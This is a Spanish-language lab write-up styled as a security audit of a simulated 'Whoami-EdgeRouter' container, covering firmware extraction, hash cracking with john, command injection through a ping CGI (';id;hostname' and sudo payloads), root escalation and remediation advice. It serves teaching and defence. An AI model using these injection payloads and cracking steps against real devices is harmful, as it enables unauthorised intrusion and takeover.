# Auditoría de Seguridad — Whoami-EdgeRouter v2.4

**Autor:** chifay  
**Plataforma:** Whoami-Labs  
**Laboratorio:** Edge Router (Track IoT Firmware Penetration Testing)  
**Dificultad:** Media — ★★★☆☆☆☆☆ (3 XP)  
**IP objetivo:** `172.17.0.2`  
**Fecha de auditoría:** 11/11/2026  
**Tipo de prueba:** Caja negra externa, desde Kali Linux  
**Resultado:** Compromiso total — acceso como `root` y obtención de la flag

> **Flag:** `Whoami{REDACTADO}` (valor original omitido en esta publicación)

> **Nota de alcance:** El análisis se realizó contra el contenedor `whoami-edgerouter` ya desplegado en `172.17.0.2`, utilizando el firmware y los servicios publicados por el propio laboratorio. Todas las pruebas se ejecutaron en un entorno local autorizado y con fines educativos.

> **Nota de redacción:** esta versión pública del informe omite las credenciales y la flag obtenidas durante la auditoría. En el texto se han sustituido por placeholders (`<PASSWORD_REDACTADA>`, `<HASH_REDACTADO>`, `SHA256:<REDACTADO>` y `Whoami{REDACTADO}`); en las capturas de pantalla, los valores reales aparecen difuminados. El usuario `admin_support` se mantiene visible porque es necesario para explicar la cadena de explotación. Los archivos de evidencia originales no se publican.

---

## 1. Resumen ejecutivo

El laboratorio simula un router perimetral *Whoami-EdgeRouter v2.4* con una arquitectura MIPS32. El servicio HTTP de gestión (puerto 80) publica sin autenticación una imagen de firmware de recuperación. El análisis de esa imagen reveló información crítica: el hash de la contraseña de `admin_support`, una clave privada SSH sin passphrase y el código fuente de un CGI de diagnóstico vulnerable a inyección de comandos.

La cadena de explotación fue:

1. Descarga del firmware sin autenticación.
2. Extracción del sistema de archivos SquashFS.
3. Obtención del hash de `admin_support` y crackeo con `john` → contraseña `<PASSWORD_REDACTADA>`.
4. Abuso de inyección de comandos en `/cgi-bin/system_test.cgi` → ejecución remota como `admin_support`.
5. Escalada a `root` mediante la regla `admin_support ALL=(ALL) ALL` de `sudo`, usando la contraseña obtenida.
6. Lectura de `/root/flag.txt`.

El impacto es **crítico**: un atacante no autenticado puede obtener ejecución de comandos y, encadenando la contraseña débil con los privilegios excesivos de `sudo`, comprometer completamente el dispositivo.

### Cadena de ataque

```text
HTTP/80 → firmware/edgerouter.bin → SquashFS → /etc/shadow + id_rsa + CGI
        → john → <PASSWORD_REDACTADA> → command injection → sudo → root → flag
```

---

## 2. Alcance y metodología

| Elemento | Detalle |
|---|---|
| Objetivo | `172.17.0.2` (contenedor `whoami-edgerouter`) |
| Puertos publicados por el lab | Host `8088→80`, `2121→21`, `2323→23`, `8443→8443` |
| Enfoque | Reconocimiento, enumeración web, análisis de firmware, explotación y post-explotación |
| Herramientas | `nmap`, `curl`, `wget`, `binwalk`, `unsquashfs`, `john`, `ssh-keygen`, `nc`, `qterminal` (capturas) |
| Credenciales obtenidas | `admin_support:<PASSWORD_REDACTADA>` |
| Resultado | `root` + flag |

La auditoría se ejecutó íntegramente desde Kali Linux contra la IP del contenedor indicada por el usuario. Las capturas de terminal se tomaron con QTerminal sobre el escritorio XFCE (`:0`) y se conservan en la carpeta `screenshots/`.

---

## 3. Reconocimiento

### 3.1 Escaneo de puertos

Se realizó un escaneo TCP completo de los 65.535 puertos:

```bash
nmap -Pn -sT -p- --min-rate 10000 172.17.0.2 -oN nmap_allports.txt
```

Resultado: únicamente cuatro puertos abiertos.

| Puerto | Servicio detectado | Observación |
|---:|---|---|
| 21/tcp | FTP | Banner `Whoami-EdgeRouter FTP Management v2.4` |
| 23/tcp | Telnet | Banner `Whoami-EdgeRouter (MIPS32 Linux 3.10)` y `login:` |
| 80/tcp | HTTP | Portal de gestión `Whoami-EdgeRouter v2.4` |
| 8443/tcp | HTTPS-alt | Responde `400 Bad Request — SSL Handshake Required` |

No se detectó SSH en el puerto 22 ni en puertos alternativos, a pesar de que el firmware contiene material de clave SSH.

![Escaneo completo de puertos](screenshots/01_ports.png)

### 3.2 Identificación de servicios y banners

El portal se identifica claramente como `Whoami-EdgeRouter v2.4 — Management Portal`. Los puertos 21, 23 y 8443 entregan banners pero cierran la conexión inmediatamente, sin permitir autenticación real. El puerto 80 es el único servicio funcional de la superficie analizada.

```bash
curl -sI http://172.17.0.2/ | head -5
curl -s http://172.17.0.2/ | grep -o '<title>[^<]*</title>'
nc -w 3 172.17.0.2 21
nc -w 3 172.17.0.2 23
nc -w 3 172.17.0.2 8443
```

La cabecera `Server` revela la tecnología subyacente:

```text
Server: BaseHTTP/0.6 Python/3.11.18
```

![Identificación de servicios y banners](screenshots/02_services.png)

> Los servicios 21/23/8443 se comportan como señuelos: entregan un banner y cierran. El código de `sys_telemetry.py` (obtenido en post-explotación) confirma que fueron implementados únicamente para simular la superficie de un router.

---

## 4. Enumeración del portal web

### 4.1 Portal y descarga de firmware

El portal no requiere autenticación y ofrece la descarga de una imagen de firmware de recuperación:

```text
/firmware/edgerouter.bin
```

Descarga:

```bash
wget -q http://172.17.0.2/firmware/edgerouter.bin -O edgerouter.bin
ls -lh edgerouter.bin
file edgerouter.bin
sha256sum edgerouter.bin
```

Datos obtenidos:

| Propiedad | Valor |
|---|---|
| Tamaño | 4,1 KB (4.096 bytes) |
| Tipo | `u-boot legacy uImage`, MIPS, NetBSD/MIPS, gzip |
| Nombre interno | `Whoami-EdgeRouter v2.4 (MIPS32)` |
| SHA-256 | `6ee00ba5ce6237891a5ec34f06eecf7f87ace3eddf6dd278aede20926c78a074` |

![Descarga e identificación del firmware](screenshots/03_firmware.png)

La descarga se realiza por HTTP sin autenticación ni verificación de integridad criptográfica. Un atacante en la red puede sustituir el firmware o analizarlo sin restricciones.

---

## 5. Análisis del firmware

### 5.1 Identificación de la estructura

`binwalk` identificó dos componentes:

- Offset `0x0`: cabecera `uImage` de 64 bytes.
- Offset `0x40`: sistema de archivos SquashFS 4.0, compresión XZ, 23 inodos.

```bash
binwalk edgerouter.bin | fold -s -w 110
```

![Análisis del firmware con binwalk](screenshots/04_binwalk.png)

La imagen es pequeña, pero suficiente para exponer los secretos del dispositivo.

### 5.2 Extracción del SquashFS

Se extrajo el sistema de archivos saltando la cabecera `uImage`:

```bash
dd if=edgerouter.bin of=firmware.squashfs bs=1 skip=64 status=none
unsquashfs -no-progress -d firmware_fs firmware.squashfs
find firmware_fs -type f -printf '%M %u:%g %p\n'
```

Archivos relevantes:

```text
-rw-------  .../home/admin_support/.ssh/id_rsa
-rwxr-xr-x  .../www/cgi-bin/system_test.cgi
-rw-r--r--  .../etc/passwd
-rw-------  .../etc/shadow
-rw-r--r--  .../etc/httpd.conf
-rw-r--r--  .../etc/dropbear/dropbear_rsa_host_key.pub
-rw-------  .../etc/dropbear/dropbear_rsa_host_key
```

![Extracción del sistema de archivos SquashFS](screenshots/05_extract.png)

### 5.3 Credenciales y clave privada expuestas

Contenido de `/etc/passwd`:

```text
root:x:0:0:root:/root:/bin/sh
admin_support:x:1000:1000:admin_support:/home/admin_support:/bin/sh
nobody:x:65534:65534:nobody:/tmp:/bin/false
```

Contenido de `/etc/shadow`:

```text
root:*:19500:0:99999:7:::
admin_support:<HASH_REDACTADO>:19500:0:99999:7:::
nobody:*:19500:0:99999:7:::
```

El hash de `admin_support` utiliza **MD5-crypt** (`$1$`), un esquema obsoleto y extremadamente rápido de crackear. Además, el firmware incluye una clave privada SSH:

```bash
ssh-keygen -lf firmware_fs/home/admin_support/.ssh/id_rsa
head -1 firmware_fs/home/admin_support/.ssh/id_rsa
```

Resultado:

```text
2048 SHA256:<REDACTADO> root@spider (RSA)
-----BEGIN OPENSSH PRIVATE KEY-----
```

La clave no tiene passphrase y su clave pública es **idéntica** a la clave de host de Dropbear (`/etc/dropbear/dropbear_rsa_host_key.pub`). Es decir, el material privado del servicio SSH del dispositivo se distribuye dentro del firmware y se reutiliza como clave del usuario `admin_support`.

![Credenciales y clave privada en el firmware](screenshots/06_creds.png)

### 5.4 CGI vulnerable en el firmware

El firmware incluye `/www/cgi-bin/system_test.cgi`, un diagnóstico de ping. Su lógica es:

```sh
TARGET=$(echo "$QUERY_STRING" | sed -n 's/^.*target=\([^&]*\).*$/\1/p' | sed ...)
...
eval "ping -c 1 $TARGET 2>&1"
```

`TARGET` se construye directamente desde la query string y se ejecuta con `eval`, sin validación. La aplicación Python desplegada replica el mismo patrón:

```python
cmd = f"ping -c 1 {target}"
proc = subprocess.Popen(
    cmd,
    shell=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    executable="/bin/sh",
    preexec_fn=demote
)
```

El parámetro `target` llega desde `parse_qs` y se interpola en una cadena ejecutada por `/bin/sh`. Esto convierte el endpoint en una vulnerabilidad de **inyección de comandos OS**.

![Código del CGI vulnerable](screenshots/07_cgi.png)

---

## 6. Explotación

### 6.1 Crackeo del hash

Se copió el hash a un archivo y se crackeó con `john` y `rockyou.txt`:

```bash
echo 'admin_support:<HASH_REDACTADO>' > shadow_hash.txt
john --format=md5crypt \
     --wordlist=/usr/share/wordlists/rockyou.txt \
     --pot=edge.pot shadow_hash.txt
john --show --format=md5crypt --pot=edge.pot shadow_hash.txt
```

Resultado:

```text
admin_support:<PASSWORD_REDACTADA>

1 password hash cracked, 0 left
```

La contraseña se obtuvo en menos de un segundo. MD5-crypt y una contraseña tan débil hacen que la exposición del hash sea equivalente a la exposición de la credencial en claro.

![Crackeo del hash de admin_support](screenshots/08_john.png)

### 6.2 Inyección de comandos

Se confirmó la ejecución remota enviando `id` y `hostname` como comandos concatenados al parámetro `target`:

```bash
curl -s \
  'http://172.17.0.2/cgi-bin/system_test.cgi?target=127.0.0.1;id;hostname'
```

Respuesta:

```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.029 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.029/0.029/0.029/0.000 ms
uid=1000(admin_support) gid=1000(admin_support) groups=1000(admin_support),0(root)
whoami-edgerouter
```

La aplicación ejecuta los comandos como `admin_support`, pero el proceso conserva el grupo suplementario `0(root)`. Esto es consecuencia de un *drop* de privilegios incompleto: se llama a `setgid()` y `setuid()`, pero no a `setgroups([])`. El resultado es que el usuario sin privilegios mantiene acceso de lectura a archivos del grupo `root`, como `/etc/sudoers` (`0440 root:root`).

![Inyección de comandos y ejecución como admin_support](screenshots/09_rce.png)

### 6.3 Escalada a root

Con la contraseña `<PASSWORD_REDACTADA>` se verificaron los privilegios de `sudo`:

```bash
curl -s --get \
  --data-urlencode 'target=127.0.0.1 >/dev/null; echo <PASS> | sudo -S -l' \
  http://172.17.0.2/cgi-bin/system_test.cgi
```

Resultado:

```text
User admin_support may run the following commands on whoami-edgerouter:
    (ALL) ALL
```

La regla `admin_support ALL=(ALL) ALL` permite ejecutar cualquier comando como `root`. Se confirmó el compromiso total y se leyó la flag:

```bash
curl -s --get \
  --data-urlencode 'target=127.0.0.1 >/dev/null; echo <PASS> | sudo -S bash -c "id; cat /root/flag.txt"' \
  http://172.17.0.2/cgi-bin/system_test.cgi
```

Resultado:

```text
[sudo] password for admin_support: uid=0(root) gid=0(root) groups=0(root)
Whoami{REDACTADO}
```

![Escalada a root y lectura de la flag](screenshots/10_root_flag.png)

---

## 7. Post-explotación y evidencia adicional

Una vez obtenido `root`, se revisó la configuración del contenedor. Los hallazgos adicionales fueron:

### 7.1 Archivos de la aplicación con permisos 0666

```text
-rw-rw-rw- 1 root root 9224 ... /app/app.py
-rw-rw-rw- 1 root root 1671 ... /app/sys_telemetry.py
-rw-rw-rw- 1 root root  ... /app/firmware/edgerouter.bin
```

`app.py` y `sys_telemetry.py` son escribibles por cualquier usuario. La aplicación web se ejecuta como `root` —confirmado en `/proc/29/status` y `/proc/30/status` (`Uid: 0 0 0 0`, `Groups: 0`)—; si el servicio se reinicia después de una modificación, el código alterado se ejecutaría con privilegios de root. Esto constituye una vía de **persistencia y escalada local**, además de permitir la manipulación del firmware servido a los clientes.

### 7.2 Grupo suplementario root

```text
uid=1000(admin_support) gid=1000(admin_support) groups=1000(admin_support),0(root)
```

El proceso que se ejecuta como `admin_support` conserva el grupo suplementario `root`. En la práctica, esto le permite leer `/etc/sudoers` y otros archivos del grupo `root`, y refuerza la escalada de privilegios. El *drop* de privilegios de la aplicación es incompleto.

### 7.3 Servicios señuelo

El código de `sys_telemetry.py` confirma que los puertos 21, 23 y 8443 solo aceptan la conexión, envían un banner y cierran:

```python
def run_ftp_service():   # bind 0.0.0.0:21
def run_telnet_service(): # bind 0.0.0.0:23
def run_ssl_service():   # bind 0.0.0.0:8443
```

No hay autenticación real ni transferencia de archivos. Son parte de la simulación del router y no constituyeron el vector de entrada.

### 7.4 Flag

```text
Whoami{REDACTADO}
```

La flag original y el resto de la evidencia se conservan en el directorio privado `loot/` (`app.py.raw`, `sys_telemetry.py.raw`, `shadow.txt`, `sudoers.txt`, `system_test.cgi`), que no forma parte de esta publicación.

---

## 8. Hallazgos y severidad

| ID | Hallazgo | Severidad | CVSS aprox. | Evidencia |
|---|---|---|---|---|
| F-01 | Inyección de comandos OS en `/cgi-bin/system_test.cgi` | **Crítica** | 9.8 | Captura 09 |
| F-02 | Contraseña débil `<PASSWORD_REDACTADA>` + `sudo ALL` → root | **Crítica (cadena)** | 9.8 | Capturas 08 y 10 |
| F-03 | Firmware sin autenticación expone hash y clave privada | **Alta** | 7.5 | Capturas 03 y 06 |
| F-04 | Clave privada SSH sin passphrase y reutilizada como host key | **Alta** | 7.5 | Captura 06 |
| F-05 | *Drop* de privilegios incompleto: grupo suplementario `root` | **Alta** | 6.5 | Captura 09 |
| F-06 | Código y firmware con permisos `0666` | **Media/Alta** | 6.5 | Post-explotación |
| F-07 | Portal de gestión sobre HTTP, sin TLS ni autenticación | **Media** | 5.3 | Capturas 02 y 03 |
| F-08 | Divulgación de versión y tecnología en cabeceras/banners | **Baja** | 3.7 | Captura 02 |
| F-09 | Servicios 21/23/8443 señuelo, sin función real | **Informativa** | — | Captura 02 |

### F-01 — Inyección de comandos OS (Crítica)

**Causa:** el parámetro `target` se interpola en una cadena ejecutada por `/bin/sh` con `shell=True`. No existe validación de formato ni allowlist de destinos.

**Impacto:** ejecución remota de comandos sin autenticación como `admin_support`; base para la escalada a root.

**Remediación:**
- No usar `shell=True`; ejecutar `subprocess.run(["ping", "-c", "1", target])`.
- Validar `target` con `ipaddress.ip_address()` y rechazar cualquier otro formato.
- Deshabilitar el diagnóstico en producción o protegerlo con autenticación y allowlist.
- Ejecutar el CGI en un sandbox sin privilegios y con grupos suplementarios vacíos.

### F-02 — Contraseña débil y privilegios excesivos (Crítica, cadena)

**Causa:** hash MD5-crypt en el firmware + contraseña `<PASSWORD_REDACTADA>` + regla `admin_support ALL=(ALL) ALL`.

**Impacto:** un atacante que obtiene el firmware puede crackear la contraseña y, tras el RCE, obtener root sin explotar otra vulnerabilidad.

**Remediación:**
- Eliminar la regla `ALL=(ALL) ALL`; aplicar el principio de mínimo privilegio con comandos específicos.
- Usar contraseñas robustas y únicas; migrar de MD5-crypt a `yescrypt`/Argon2.
- No incluir hashes en el firmware; usar credenciales por dispositivo y rotación.
- Requerir MFA para el acceso administrativo.

### F-03 — Exposición de firmware y secretos (Alta)

**Causa:** `/firmware/edgerouter.bin` se sirve por HTTP sin autenticación y el firmware contiene `/etc/shadow`, la clave privada Dropbear y la clave de `admin_support`.

**Impacto:** cualquier usuario de red puede descargar el firmware, extraer credenciales y material criptográfico y preparar el compromiso.

**Remediación:**
- Firmar criptográficamente el firmware y verificar la firma antes de instalar.
- Cifrar o eliminar secretos del imagen; generar claves únicas en el primer arranque.
- Servir firmware por HTTPS con autenticación y control de acceso.
- Publicar hashes y firmas para verificación de integridad.

### F-04 — Clave privada SSH sin passphrase y reutilizada (Alta)

**Causa:** `id_rsa` de `admin_support` no tiene passphrase y su clave pública coincide con la host key de Dropbear.

**Impacto:** suplantación del host SSH y, si la clave está autorizada, acceso como el usuario propietario. La reutilización de clave host/usuario amplifica el impacto. En este laboratorio no se detectó SSH escuchando, por lo que la clave no se utilizó para el acceso; aun así, su exposición y reutilización siguen siendo un riesgo crítico para cualquier despliegue real.

**Remediación:**
- Generar claves de host únicas por dispositivo en el primer arranque.
- No reutilizar la host key como clave de usuario.
- Proteger claves privadas con passphrase o almacenamiento hardware.
- Rotar todas las claves expuestas.

### F-05 — Drop de privilegios incompleto (Alta)

**Causa:** `demote()` ejecuta `os.setgid()` y `os.setuid()`, pero no `os.setgroups([])`. El proceso conserva el grupo suplementario `0(root)`.

**Impacto:** el usuario `admin_support` mantiene acceso de lectura a archivos del grupo `root` (por ejemplo `/etc/sudoers`) y a otros recursos group-writable, facilitando la escalada.

**Remediación:**
- Llamar a `os.setgroups([])` antes de `setgid()`/`setuid()`.
- Verificar el resultado con `id` y pruebas automatizadas.
- Usar un usuario dedicado sin grupos suplementarios y, preferiblemente, `setresuid`/`setresgid`.

### F-06 — Código y firmware escribibles por todos (Media/Alta)

**Causa:** `/app/app.py`, `/app/sys_telemetry.py` y `/app/firmware/edgerouter.bin` tienen modo `0666`.

**Impacto:** un usuario local puede alterar código ejecutado por root (persistencia/escalada tras reinicio) o sustituir el firmware distribuido.

**Remediación:**
- Permisos `0644`/`0755` y propietario `root`.
- Sistema de archivos de solo lectura e integridad verificada.
- Monitorizar cambios en código y firmware.

### F-07 — Portal HTTP sin TLS ni autenticación (Media)

**Causa:** el portal y la descarga de firmware usan HTTP en claro; no hay autenticación ni cabeceras de seguridad.

**Impacto:** interceptación, modificación de firmware en tránsito y acceso no autorizado a la información del dispositivo.

**Remediación:**
- HTTPS obligatorio con HSTS y certificados válidos.
- Autenticación y autorización para el portal y las descargas.
- Cabeceras `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`.

### F-08 — Divulgación de versión/tecnología (Baja)

**Causa:** `Server: BaseHTTP/0.6 Python/3.11.18` y banners con modelo/versión.

**Impacto:** facilita el fingerprinting y la selección de exploits.

**Remediación:** ocultar versiones y usar cabeceras genéricas; mantener el software actualizado.

### F-09 — Servicios señuelo (Informativa)

**Causa:** 21/23/8443 aceptan conexión, envían banner y cierran.

**Impacto:** en este laboratorio son señuelos; en un dispositivo real, FTP/Telnet legados serían superficie de ataque crítica.

**Remediación:** deshabilitar servicios no necesarios; si son señuelos, documentarlo y asegurarse de que no expongan información sensible.

---

## 9. Recomendaciones priorizadas

### Inmediatas

1. **Eliminar la inyección de comandos** y deshabilitar el endpoint de diagnóstico en producción.
2. **Rotar** la contraseña de `admin_support`, la clave SSH y la host key de Dropbear.
3. **Eliminar** `admin_support ALL=(ALL) ALL` de sudoers y aplicar mínimo privilegio.
4. **Retirar secretos del firmware** y firmar/verificar las imágenes.

### Corto plazo

5. Corregir el *drop* de privilegios con `setgroups([])` y validar con `id`.
6. Cambiar permisos `0666` a `0644`/`0755` y montar el sistema de archivos en solo lectura.
7. Publicar el portal únicamente por HTTPS con autenticación y cabeceras de seguridad.
8. Deshabilitar FTP/Telnet y cualquier servicio señuelo innecesario.

### Largo plazo

9. Integrar análisis de secretos y revisión de firmware en el SDLC.
10. Implementar arranque seguro, firma de firmware y rotación automática de claves.
11. Realizar pruebas de penetración periódicas y auditorías de configuración.
12. Aplicar segmentación de red y monitorización de integridad.

---

## 10. Anexos

### A. Comandos principales

```bash
# Reconocimiento
nmap -Pn -sT -p- --min-rate 10000 172.17.0.2 -oN nmap_allports.txt

# Firmware
wget -q http://172.17.0.2/firmware/edgerouter.bin -O edgerouter.bin
binwalk edgerouter.bin
dd if=edgerouter.bin of=firmware.squashfs bs=1 skip=64 status=none
unsquashfs -no-progress -d firmware_fs firmware.squashfs

# Credenciales
cat firmware_fs/etc/shadow
ssh-keygen -lf firmware_fs/home/admin_support/.ssh/id_rsa

# Crackeo
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt \
     --pot=edge.pot shadow_hash.txt

# Explotación
curl -s 'http://172.17.0.2/cgi-bin/system_test.cgi?target=127.0.0.1;id;hostname'

# Root y flag
curl -s --get \
  --data-urlencode 'target=127.0.0.1 >/dev/null; echo <PASS> | sudo -S bash -c "id; cat /root/flag.txt"' \
  http://172.17.0.2/cgi-bin/system_test.cgi
```

### B. Indicadores y datos clave

| Dato | Valor |
|---|---|
| SHA-256 firmware | `6ee00ba5ce6237891a5ec34f06eecf7f87ace3eddf6dd278aede20926c78a074` |
| Hash `admin_support` | `<HASH_REDACTADO>` |
| Contraseña | `<PASSWORD_REDACTADA>` |
| Fingerprint SSH | `SHA256:<REDACTADO>` |
| Flag | `Whoami{REDACTADO}` |

### C. Índice de capturas

| Captura | Contenido |
|---|---|
| `screenshots/01_ports.png` | Escaneo completo de puertos |
| `screenshots/02_services.png` | Portal y banners de servicios |
| `screenshots/03_firmware.png` | Descarga e identificación del firmware |
| `screenshots/04_binwalk.png` | Estructura `uImage` + SquashFS |
| `screenshots/05_extract.png` | Extracción y archivos del firmware |
| `screenshots/06_creds.png` | `/etc/shadow`, clave privada y fingerprint |
| `screenshots/07_cgi.png` | Código del CGI vulnerable |
| `screenshots/08_john.png` | Crackeo del hash |
| `screenshots/09_rce.png` | Inyección de comandos y `id` |
| `screenshots/10_root_flag.png` | `sudo`, root y flag |

### D. Archivos de evidencia (no publicados)

Los archivos originales se conservan en el entorno privado de la auditoría y no se incluyen en el repositorio público:

```text
loot/app.py.raw
loot/sys_telemetry.py.raw
loot/passwd.txt
loot/shadow.txt
loot/sudoers.txt
loot/system_test.cgi
loot/httpd.conf
loot/ssh_key_fingerprint.txt
loot/post_exploit.txt
loot/flag.txt
nmap_allports.txt
nmap_initial.txt
```

---

## Conclusión

El laboratorio demuestra una cadena de compromiso completa y realista para un dispositivo IoT/perimetral: una superficie web mínima, un firmware distribuido sin protección, secretos embebidos y una concatenación de errores de validación y de privilegios. La combinación de **inyección de comandos + contraseña débil + sudo sin restricciones** permite pasar de un acceso no autenticado a `root` en pocos minutos.

La lección principal es que la seguridad de un dispositivo no depende solo del servicio expuesto: el firmware, las credenciales y las claves que contiene forman parte de la superficie de ataque. Un firmware firmado, sin secretos, con credenciales únicas y un modelo de privilegios mínimo habría roto la cadena en varios puntos.
